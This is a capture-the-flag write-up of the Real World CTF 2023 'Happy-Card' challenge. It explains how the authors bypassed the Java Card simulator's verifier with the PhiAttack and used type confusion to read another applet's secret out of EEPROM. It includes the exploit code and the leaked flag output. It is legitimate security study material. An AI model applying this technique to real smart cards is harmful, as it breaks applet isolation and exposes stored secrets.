---
layout: post
title: "Real World CTF 2023: Happy-Card Writeup"
categories: writeups
authors:
  - I Al Istannen
  - rad4day
---

[Real World CTF 2023](https://realworldctf.com/challenge) was a jeopardy-style capture-the-flag event.
We participated as part of the [Sauercloud](https://ctftime.org/team/54748) CTF-team.

## How Solve? Where Exploit?

- Google for java card stuff
- Find [some usable tooling to build your own applets](https://github.com/martinpaljak/ant-javacard)
- Enable EEPROM dumping in cref (`-o /upload/eeprom`)
- Stumble upon [Sergei Volokitin's Master's Thesis](https://www.ru.nl/publish/pages/769526/sergei_volokitin.pdf) for an overview of vulnerabilities
    - Try multiple, but be caught by byte code verification/type checking
- Stumble upon [PhiAttack](https://cardis2021.its.uni-luebeck.de/papers/CARDIS2021_Dubreuil.pdf)
    - Needs older sdk
    - Implement simple type confusion between `Object` and `byte[]`
- Be confused why some casts work and others don't
    - reverse cref `__saload` and `__baload` read checks
- Use type confusion to cast an `Object` to a `byte[]` array with arbitrary length
- Read EEPROM data using (now no longer) out-of-bounds read on `byte[]`
- Read flag 🍉


## Challenge Description

Suppose we have a card and can load something on it.
`nc 198.11.179.216 7788`

When you connect to the service you are asked for your team-id then you're prompted to upload a tar file containing your `.cap` file[s].

The attachment contains
```
  creating: attachments/
  inflating: attachments/Dockerfile
   creating: attachments/files/
  inflating: attachments/files/entrypoint.sh
  inflating: attachments/files/hello.cap
  inflating: attachments/files/java_card_simulator-3_1_0-u5-win-bin-do-b_70-09_mar_2021.msi
  inflating: attachments/files/java_card_tools-win-bin-b_17-06_jul_2021.zip
  inflating: attachments/start.sh
```

So a pretty basic docker setup as well as a `hello.cap`, and a few tools related to `java-card` including the simulator in version 3.1.0u5.

## The Entrypoint
```bash
[...]

verifycap() {
	java -Djc.home="$JC_HOME_TOOLS" -classpath "$TOOLS_CP" com.sun.javacard.offcardverifier.Verifier -nobanner $@
}

scriptgen() {
	java -Djc.home="$JC_HOME_SIM" -classpath "$SIM_CP" com.sun.javacard.scriptgen.Main -nobanner $@
}

script=/tmp/script

verifycap -outfile /tmp/hello.cap.digest /files/hello.cap # 3
scriptgen -hashfile /tmp/hello.cap.digest -o /tmp/hello.cap.script /files/hello.cap # 3
cat << EOF > $script
powerup;
output off; # 1
0x00 0xA4 0x04 0x00 0x09 0xA0 0x00 0x00 0x00 0x62 0x03 0x01 0x08 0x01 0x7F; # 2
EOF
FLAG=`echo -n "$FLAG"|perl -lne 'print map {"0x".(unpack "H*",$_)." "} split //, $_;'`
cat /tmp/hello.cap.script >> $script # 3
cat << EOF >> $script
0x80 0xB8 0x00 0x00 0x08 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xAA 0x00 0x7F;
0x00 0xA4 0x04 0x00 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xAA 0x7F; # 4
0x88 0x88 0x00 0x00 0x30 $FLAG 0x7f; # 5
0x00 0xA4 0x04 0x00 0x09 0xA0 0x00 0x00 0x00 0x62 0x03 0x01 0x08 0x01 0x7F; # 6
EOF

TMPDIR=/jctmp
mkdir $TMPDIR
cd /upload
for capfile in *.cap; do # 7
    [ -f "$capfile" ] || continue
	verifycap -outfile "$TMPDIR/$capfile.digest" /upload/*.exp "$capfile" || { echo "verify failed"; exit; }
	scriptgen -hashfile "$TMPDIR/$capfile.digest" -o "$TMPDIR/$capfile.script" "$capfile" || { echo "scriptgen failed"; exit; }
	cat "$TMPDIR/$capfile.script" >> /tmp/script
done
echo "All verification finished"

cat << EOF >> $script
0x80 0xB8 0x00 0x00 0x08 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xFF 0x00 0x7F; # 8
0x00 0xA4 0x04 0x00 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xFF 0x7F; # 9
output on; # 10
0x88 0x66 0x00 0x00 0x00 0x7f; # 11
EOF

wine 'C:\Program Files\Oracle\Java Card Development Kit Simulator 3.1.0\bin\cref_t1.exe' -nobanner -nomeminfo &
sleep 5
java -Djc.home="$JC_HOME_SIM" -classpath "$SIM_CP" com.sun.javacard.apdutool.Main -nobanner -noatr $script
```

The APDU commands in this script do the following:
1. disable output
2. switch to installer applet
3. upload hello.cap
4. switch to hello applet
5. insert flag into EEPROM
6. switch to installer applet
7. user provided cap files 
    - verify, script gen, install
8. create instance of applet with AID 0xAA 0xBB 0xCC 0xDD 0xEE 0xFF
9. switch to applet with AID 0xAA 0xBB 0xCC 0xDD 0xEE 0xFF
10. enable output
11. talk randomly to applet to start processing?

## The Safe Application
No source code was provided, but the contained java bytecode is easy to disassemble using e.g. [recaf](https://github.com/Col-E/Recaf).
The applet listens for a specific command and writes the data following it to a class variable, but provides no means of retrieving the data afterwards.
Class variables in JavaCard are persistently stored in EEPROM.
```java
// Decompiled with: CFR 0.152
// Class Version: 7
package com.rw.hello;

import javacard.framework.APDU;
import javacard.framework.Applet;
import javacard.framework.ISOException;
import javacard.framework.JCSystem;
import javacard.framework.Util;

public class safe
extends Applet {
    private byte[] secret = new byte[48];
    private boolean isInit = false;

    public static void install(byte[] bArray, short bOffset, byte bLength) {
        new safe();
    }

    protected safe() {
        this.register();
    }

    public void process(APDU apdu) {
        byte[] buffer = apdu.getBuffer();
        if (buffer[0] == 0 && buffer[1] == -92) {
            return;
        }
        if (buffer[0] == -120 && buffer[1] == -120) {
            if (buffer[4] != 48) {
                ISOException.throwIt((short)26368);
            }
            if (this.isInit) {
                ISOException.throwIt((short)27014);
            }
            JCSystem.beginTransaction();
            Util.arrayCopy(buffer, (short)5, this.secret, (short)0, (short)48);
            this.isInit = true;
            JCSystem.commitTransaction();
            return;
        }
        if (buffer[0] == -120 && buffer[1] == 102) {
            if (buffer[4] != 48) {
                ISOException.throwIt((short)26368);
            }
            if (!this.isInit) {
                ISOException.throwIt((short)27014);
            }
            JCSystem.beginTransaction();
            Util.arrayCopy(buffer, (short)5, this.secret, (short)0, (short)48);
            JCSystem.commitTransaction();
            return;
        }
    }
}

```

## EEPROM Object Layout
![](/imgs/rwctf23-happycard-imhex.png)

We've taken the liberty to create a small imHex-Pattern to highlight a few of the important bits of an EEPROM dump we obtained during analysing of the challenge.

The first highlighted block is a `byte[]` filled with `A`s, directly followed by the definition of our ExploitApplet.

The second highlighted block is a custom Object we named `Foo`, containing a field `short len = 0x1337`.

And the final block is the flag array we want to read, which isn't completely straight forward, as the java card simulator implements a few features to isolate our ExploitApplet from the Safe.

### Object References
To ensure that applets can not blindly access methods on objects from other applets, cref does not directly store references as pointers.
Instead, pointers are represented by *handles*.
A handle is a `short` value representing the object, similar to a file descriptor in Unix.
When an object handle is looked up, the security context of the caller is compared to the security context of the object behind the handle.
If the caller shouldn't be allowed to perform the access, an exception is thrown.

### Anatomy of an Array
Let's take a good look at our self-defined array. It consists of the following fields:

```c
struct Array { // header length: 8 byte
    u16 objectTag = 0x8000;    // this object represents a byte array
    u8 securityContext = 0x22;
    u16 arrayType = 0x0;       // this is a byte array?
    u8 arrayMagic = 0x1C;      // this is an array
    u16 length = 0x30;
    // end of header, followed by data
    u8 data[length];
};
```

Note that the flag array has a different `securityContext`.

### Anatomy of Objects
Our array is directly followed by the definition of our ExploitApplet.

```c
struct ObjectHeader { // length: 6 byte
    u16 objectTag;
    u8 securityContext;
    u16 classDef;
    u8 package;
};
struct ExploitApplet {
    ObjectHeader header;
    u16 dontKnow;
    u16 meMySelfAndI = 0xda; // Object ref
    u16 test = 0xdb;         // byte[] ref
    u16 longarr = 0xda;      // byte[] ref
    u16 tag = 0x1234;        // short
    u16 tag2 = 0x5678;       // short
};
```


## Type Confusion

While the memory space is continuous, array bounds are checked on reads.
Therefore, we can not read anything beyond the bounds of our arrays.
A [common](https://www.ru.nl/publish/pages/769526/sergei_volokitin.pdf) technique to circumvent this, is to convert a `byte[]` array to a larger type, typically a `short[]`. 
This would allow us to read twice as much memory with an array of the same size.
Looking at the imhex screenshot, the flag array is positioned *after* our own applet and objects in memory -- reading memory behind what we should be able to do would include the flag!

A common technique to create such a type confusion is uploading a CAP file with invalid bytecode, e.g. omitting a `checkcast`.
Sadly, the entrypoint shell script runs the off-card verifier on our uploaded CAP files which happily aborts with an error.

A different technique is exploiting compile and runtime differences.
We can compile our exploit against a library with the following method:
```java
public byte[] fromShort(short input) {
    return null; // this is fine!
}
```
At runtime though, we supply a different version of this library:
```java
public byte[] fromShort(byte[] input) {
    return this; // this is fine!
}
```
Both of these methods are fine on their own and using them passes bytecode verification.
At runtime though, we suddenly turn our input `short` into a `byte` array.
However, things aren't quite so simple.
To export and import libraries, javacard files generate so-called *export files* (`.exp`). 
These files contain the signature of the methods you export and are checked at two points:
- when generating or loading the library
- when importing a function from the library

No matter what we do, one of these checks now always fails:
Either the import fails as we use a method taking a `short`, but the method in the export file takes a `byte[]` or the export file is not congruent with our library code.
Both of these result in verification errors.

Enter the [*PhiAttack*](https://cardis2021.its.uni-luebeck.de/papers/CARDIS2021_Dubreuil.pdf) by Jean Dubreuil and Guillaume Bouffard.

### The PhiAttack

To circumvent the verification, we simultaneously need to produce a congruent export file and also import the methods as they were exported.
This is not possible with two cap files, but we aren't constrained to just two.

By creating a layout similar to the following (from the paper linked above):

![](/imgs/rwctf23-happycard-phiattack.png)

We can trick the verifier into accepting all CAP files, while *still* having a method performing a type confusion.

### More Confusion

Rather annoyingly, the simulator also very specifically stores the array's type in each array object and actually checks it on every read.
More specifically, the
- `aaload` opcode checks that you read from a reference array
- `saload` opcode checks that you read from a short array
- `iaload` opcode checks that you read from an int array
- `baload` opcode checks that you are not reading from any of the above. <strong style="font-weight: bold;">wat</strong>.

Therefore, we are free to read bytes from *anything*, provided it is not a `short`, `int` or `Object` array.

Very conveniently, the `Object` header is 2 bytes shorter than the `array` header. This allows us to freely control the `length` field, if we manage to interpret an `Object` as an array :)

## The Code

Instead of returning `void` and `short`, we convert an `Object` parameter to a `short`, thereby obtaining the handle of the `Object`.

The exploit code itself is now quite short:
```java
// Perform the PhiAttack
PhiProxy proxyInstance = new PhiProxy();
Phi phiInstance = proxyInstance;

// Type confusion: Convert our object to its short handle
short meMySelfAndIHandle = phiInstance.toShort(meMySelfAndI);

// Convert the handle back, but this time to a byte array
// and not the Object it actually represents
longarr = phiInstance.fromShort(meMySelfAndIHandle);

// read from the array, leaking the flag
byte[] buffer = apdu.getBuffer();
Util.arrayCopyNonAtomic(
    longarr,
    // read start index. Skip far enough ahead to reach the flag
    (short) 0x2b5,
    buffer,
    (short) 0,
    // bytes to read. Read enough. 0x85 seems to be max buffer length
    (short) 0x85
);
apdu.setOutgoingAndSend((short) 0, (short) 0x85);
```

## Flag

```
[ INFO: ] Verification completed with 0 warnings and 0 errors.
All verification finished
Mask has now been initialized for use
OUTPUT OFF;
OUTPUT ON;
CLA: 88, INS: 66, P1: 00, P2: 00, Lc: 00, Le: 85, 30, 72, 77, 63, 74, 66, 7b, 48, 34, 70, 70, 79, 43, 61, 33, 64, 37, 30, 36, 32, 32, 39, 39, 31, 62, 39, 37, 32, 33, 38, 39, 61, 31, 66, 30, 35, 37, 35, 65, 64, 37, 64, 32, 30, 34, 38, 38, 66, 7d, 80, 68, 01, 01, 80, 73, 01, 01, 00, 80, 00, 00, ff, 00, 01, 03, 00, 00, 86, d1, 86, d2, 86, d3, 80, 00, 00, 00, 00, 1c, 00, 06, aa, bb, cc, dd, ee, 10, 20, 00, 00, 00, 11, 05, 00, c6, 20, 00, 11, 00, 00, 1d, 00, 94, 00, c3, 01, 00, 80, 00, 10, 00, 00, 1c, 00, 04, 73, 61, 66, 65, 80, 00, 10, 00, 00, 1c, 00, 0c, 63, 6f, 6d, 2e, 72, 77, SW1: 90, SW2: 00
C-JCRE was powered down.
bye%  
```
Which, after conversion from hex, turns into this magnificent string:
```
0rwctf{H4ppyCa3d70622991b972389a1f0575ed7d20488f}.h...s......ÿ......Ñ.Ò.Ó........ª»ÌÝî. ......Æ ........Ã..........safe........com.rw
```
🍉

